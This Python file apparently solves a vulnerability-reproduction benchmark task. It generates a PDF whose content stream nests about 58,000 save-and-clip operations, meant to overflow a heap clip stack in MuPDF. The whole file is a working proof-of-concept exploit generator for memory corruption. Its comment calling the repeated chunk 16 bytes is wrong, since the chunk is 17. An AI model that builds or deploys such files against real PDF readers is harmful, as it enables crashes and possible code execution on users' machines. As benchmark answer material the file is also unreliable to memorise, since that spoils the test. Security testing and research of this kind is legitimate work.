class Solution:
    def solve(self, src_path: str) -> bytes:
        # The problem describes a heap buffer overflow in the clip stack due to unchecked nesting depth.
        # This vulnerability is associated with MuPDF (and likely OSS-Fuzz issue 42537168).
        # We need to generate a PDF file that performs a large number of nested clip operations
        # to overflow the allocated buffer for the clip stack.
        
        # Ground-truth PoC size is ~913KB.
        # The operation sequence "q 0 0 0 0 re W n " is 16 bytes long.
        # "q" saves graphics state.
        # "0 0 0 0 re" creates a rectangle (required for clipping).
        # "W" applies the clip (intersecting with current).
        # "n" ends the path.
        # 913919 / 16 ~= 57120 iterations.
        # We will use 58000 iterations to slightly exceed the likely ground truth depth
        # and ensure the overflow is triggered.
        
        iterations = 58000
        payload_chunk = b"q 0 0 0 0 re W n "
        stream_content = payload_chunk * iterations
        
        # Construct a valid PDF file structure
        header = b"%PDF-1.4\n"
        
        # Object 1: Catalog
        obj1 = b"1 0 obj\n<< /Type /Catalog /Pages 2 0 R >>\nendobj\n"
        
        # Object 2: Pages
        obj2 = b"2 0 obj\n<< /Type /Pages /Kids [3 0 R] /Count 1 >>\nendobj\n"
        
        # Object 3: Page
        # Uses a standard MediaBox
        obj3 = b"3 0 obj\n<< /Type /Page /Parent 2 0 R /MediaBox [0 0 595 842] /Contents 4 0 R >>\nendobj\n"
        
        # Object 4: Content Stream
        stream_len = len(stream_content)
        obj4_start = b"4 0 obj\n<< /Length " + str(stream_len).encode("ascii") + b" >>\nstream\n"
        obj4_end = b"\nendstream\nendobj\n"
        
        # Calculate offsets for the Cross-Reference Table (XREF)
        # XREF is required for a well-formed PDF, though some parsers might recover without it.
        # We generate a correct XREF to be safe.
        
        current_pos = len(header)
        off1 = current_pos
        
        current_pos += len(obj1)
        off2 = current_pos
        
        current_pos += len(obj2)
        off3 = current_pos
        
        current_pos += len(obj3)
        off4 = current_pos
        
        # Body content
        body = header + obj1 + obj2 + obj3 + obj4_start + stream_content + obj4_end
        
        # XREF Table
        xref_pos = len(body)
        xref = b"xref\n0 5\n0000000000 65535 f \n"
        xref += b"%010d 00000 n \n" % off1
        xref += b"%010d 00000 n \n" % off2
        xref += b"%010d 00000 n \n" % off3
        xref += b"%010d 00000 n \n" % off4
        
        # Trailer
        trailer = b"trailer\n<< /Size 5 /Root 1 0 R >>\nstartxref\n" + str(xref_pos).encode("ascii") + b"\n%%EOF"
        
        return body + xref + trailer